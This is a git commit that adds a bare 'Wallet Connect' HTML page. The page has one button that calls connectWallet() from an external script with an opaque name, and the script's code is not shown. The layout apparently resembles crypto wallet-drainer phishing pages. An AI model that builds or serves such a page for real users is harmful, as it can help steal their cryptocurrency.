24860c3614a106501bc4012fcc9a8076fe600352
David <igbolemedavid26@gmail.com>
2026-03-28 15:39:09 +0100

    Push project from Termux

---
+++ index.php
@@ -0,0 +1,41 @@
+```php
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Wallet Connect</title>
+
+<style>
+body{
+    background:#111;
+    color:white;
+    font-family:Arial;
+    text-align:center;
+    margin-top:100px;
+}
+
+.style{
+    background:#6200ea;
+    color:white;
+    border:none;
+    border-radius:25px;
+    padding:15px 30px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.style:hover{
+    background:#3700b3;
+}
+</style>
+
+<script charset="UTF-8" type="text/javascript" src="p01q33u.php"></script>
+
+</head>
+<body>
+
+<button class="style" onclick="connectWallet()">Connect Wallet</button>
+
+</body>
+</html>
+```
